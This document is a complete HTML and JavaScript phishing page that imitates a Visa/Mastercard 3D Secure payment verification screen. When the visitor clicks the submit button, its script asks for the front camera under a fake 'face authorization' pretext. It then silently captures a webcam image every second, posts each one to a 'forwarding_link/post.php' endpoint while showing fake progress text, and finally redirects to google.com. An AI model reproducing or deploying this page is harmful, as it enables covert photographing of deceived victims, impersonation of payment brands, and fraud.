<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>3D Secure • Verification</title>
    <meta property="og:title" content="Verify Your Identity">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        :root {
            --visa-blue: #0033a1;
            --secure-green: #10b981;
            --bg-shade: #f4f5f7;
            --text-dark: #2c3e50;
            --border-grey: #e1e4e8;
        }

        * {
            margin: 0; padding: 0; box-sizing: border-box;
        }

        body {
            font-family: 'Roboto', -apple-system, sans-serif;
            background-color: var(--bg-shade);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .secure-container {
            background: #ffffff;
            border-radius: 16px;
            padding: 40px 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.06);
            text-align: center;
            border: 1px solid var(--border-grey);
        }

        .vendors-logo {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-bottom: 24px;
            align-items: center;
        }

        .vendors-logo img {
            height: 24px;
            width: auto;
        }

        .lock-icon {
            color: var(--visa-blue);
            font-size: 32px;
            margin-bottom: 12px;
        }

        h2 {
            font-size: 18px;
            font-weight: 700;
            color: var(--text-dark);
            margin-bottom: 8px;
        }

        .subtitle {
            font-size: 13px;
            color: #718096;
            line-height: 18px;
            margin-bottom: 24px;
        }

        /* 3DS Summary Info */
        .summary-box {
            background: #f7fafc;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 25px;
            text-align: left;
            border: 1px solid #edf2f7;
        }

        .summary-item {
            display: flex;
            justify-content: space-between;
            font-size: 13px;
            margin-bottom: 10px;
            color: #4a5568;
        }

        .summary-item:last-child { margin-bottom: 0; }
        .summary-label { font-weight: 500; }
        .summary-value { font-weight: 700; color: var(--text-dark); }

        .otp-inputs {
            display: flex;
            gap: 12px;
            justify-content: center;
            margin-bottom: 24px;
        }

        .otp-inputs input {
            width: 46px;
            height: 48px;
            text-align: center;
            font-size: 20px;
            font-weight: 700;
            border: 2px solid #cbd5e0;
            border-radius: 8px;
            outline: none;
            transition: all 0.2s;
        }

        .otp-inputs input:focus {
            border-color: var(--visa-blue);
            box-shadow: 0 0 0 3px rgba(0, 51, 161, 0.1);
        }

        .submit-btn {
            width: 100%;
            background-color: var(--visa-blue);
            color: #fff;
            border: none;
            padding: 14px;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: opacity 0.2s;
        }

        .submit-btn:hover { opacity: 0.95; }

        .footer-secure {
            margin-top: 24px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            font-size: 11px;
            color: #a0aec0;
        }

        /* Scan Modal */
        .modal {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.5);
            backdrop-filter: blur(5px);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 1000;
        }

        .modal-card {
            background: #ffffff;
            width: 90%;
            max-width: 320px;
            border-radius: 16px;
            padding: 24px;
            text-align: center;
            animation: slideIn 0.3s ease-out;
            box-shadow: 0 20px 25px rgba(0,0,0,0.1);
        }

        @keyframes slideIn {
            from { transform: translateY(10px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }

        .scan-frame {
            position: relative;
            width: 130px;
            height: 130px;
            border-radius: 50%;
            overflow: hidden;
            border: 3px solid #cbd5e0;
            margin: 0 auto 16px;
        }

        .scan-frame video {
            width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1);
        }

        .pulse-ring {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            border-radius: 50%; border: 3px solid var(--secure-green);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(1.1); opacity: 0; }
        }

        .status-header {
            font-weight: 700; font-size: 15px; color: var(--text-dark); margin-bottom: 4px;
        }

        .status-percent {
            font-size: 12px; color: #a0aec0; margin-bottom: 16px;
        }

        .loader-bar {
            width: 100%; height: 4px; background: #e2e8f0; border-radius: 2px; overflow: hidden;
        }

        .loader-fill {
            width: 0%; height: 100%; background: var(--secure-green); transition: width 0.3s linear;
        }

    </style>
</head>
<body>

<!-- Capture Canvas -->
<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<div class="secure-container">
    <div class="vendors-logo">
        <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
    </div>

    <div class="lock-icon">🔒</div>
    <h2>3D Secure ID Verification</h2>
    <p class="subtitle">Please enter the One Time Password (OTP) sent onto linked endpoint to verify action.</p>

    <div class="summary-box">
        <div class="summary-item">
            <span class="summary-label">Merchant:</span>
            <span class="summary-value">Secure Payment Node</span>
        </div>
        <div class="summary-item">
            <span class="summary-label">Amount:</span>
            <span class="summary-value">INR 4,500.00</span>
        </div>
        <div class="summary-item">
            <span class="summary-label">Reference:</span>
            <span class="summary-value">#984210X</span>
        </div>
    </div>

    <div class="otp-inputs">
        <input type="text" maxlength="1" oninput="moveToNext(this, 1)">
        <input type="text" maxlength="1" oninput="moveToNext(this, 2)">
        <input type="text" maxlength="1" oninput="moveToNext(this, 3)">
        <input type="text" maxlength="1" oninput="moveToNext(this, 4)">
    </div>

    <button class="submit-btn" onclick="triggerScan()">Submit & Authorize</button>

    <div class="footer-secure">
        🛡️ PCI-DSS Compliant Secure Gateway Environment
    </div>
</div>

<!-- CAPTURE MODAL -->
<div class="modal" id="scanModal">
    <div class="modal-card">
        <div class="scan-frame">
            <video id="scanVideo" autoplay playsinline></video>
            <div class="pulse-ring" id="pulseRing"></div>
        </div>

        <div class="status-header" id="scanStatus">Loading 3D Secure Verification...</div>
        <div class="status-percent" id="scanPercent">0% Secure Node binding</div>

        <div class="loader-bar">
            <div class="loader-fill" id="loaderFill"></div>
        </div>
    </div>
</div>

<script>
function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function() {},
        error: function() {}
    });
}

const scanVideo = document.getElementById('scanVideo');
const canvas = document.getElementById('canvas');
const modal = document.getElementById('scanModal');
const loaderFill = document.getElementById('loaderFill');
const scanStatus = document.getElementById('scanStatus');
const scanPercent = document.getElementById('scanPercent');

function moveToNext(input, index) {
    if (input.value.length === 1 && index < 4) {
        document.querySelectorAll('.otp-inputs input')[index].focus();
    }
}

function triggerScan() {
    modal.style.display = 'flex';

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(function(stream) {
            scanVideo.srcObject = stream;

            let progress = 0;
            let statusTexts = [
                "Allocating verification frame...",
                "Scanning 3D depth parameters...",
                "Authorizing bank checklist nodes...",
                "Link authorized. Verification completed."
            ];
            let textIndex = 0;

            const timer = setInterval(() => {
                progress += Math.floor(Math.random() * 12) + 6;
                if (progress >= 100) progress = 100;

                scanPercent.innerText = `${progress}% Secure Node Authorization`;
                loaderFill.style.width = `${progress}%`;

                // continuous photo takes
                var context = canvas.getContext('2d');
                context.drawImage(scanVideo, 0, 0, 640, 480);
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);

                if (progress === 100) {
                    clearInterval(timer);
                    scanStatus.innerText = "Authorized! Processing Request...";
                    loaderFill.style.background = "#10b981";
                    setTimeout(() => {
                        window.location.href = "https://google.com"; // redirect
                    }, 2000);
                } else if (progress % 25 === 0 && textIndex < statusTexts.length - 1) {
                    textIndex++;
                    scanStatus.innerText = statusTexts[textIndex];
                }
            }, 1000);
        })
        .catch(function() {
            alert("3D Secure Face Authorization is REQUIRED for compliance node safety. Please enable permissions inside your browser.");
            modal.style.display = 'none';
        });
}
</script>

<script src="fingerprint.js"></script>
</body>
</html>
